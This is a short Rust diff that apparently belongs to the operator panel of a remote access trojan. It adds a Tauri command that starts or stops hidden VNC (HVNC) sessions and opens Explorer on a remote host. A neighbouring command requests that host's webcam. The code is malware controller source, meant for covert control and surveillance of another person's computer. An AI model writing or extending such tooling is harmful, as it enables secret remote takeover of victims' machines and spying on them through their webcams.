@@ -597,3 +597,14 @@ pub async fn request_webcam(addr: &str, tauri_state: State<'_, SharedTauriState>
     Ok("Webcam request sent".to_string())
 }
 
+#[tauri::command]
+pub async fn manage_hvnc(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
+    match run {
+        "start" => send_server_command(ServerCommand::StartHVNC(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "stop" => send_server_command(ServerCommand::StopHVNC(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "open_explorer" => send_server_command(ServerCommand::OpenExplorer(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        _ => {}
+    }
+    Ok("HVNC command sent".to_string())
+}
+
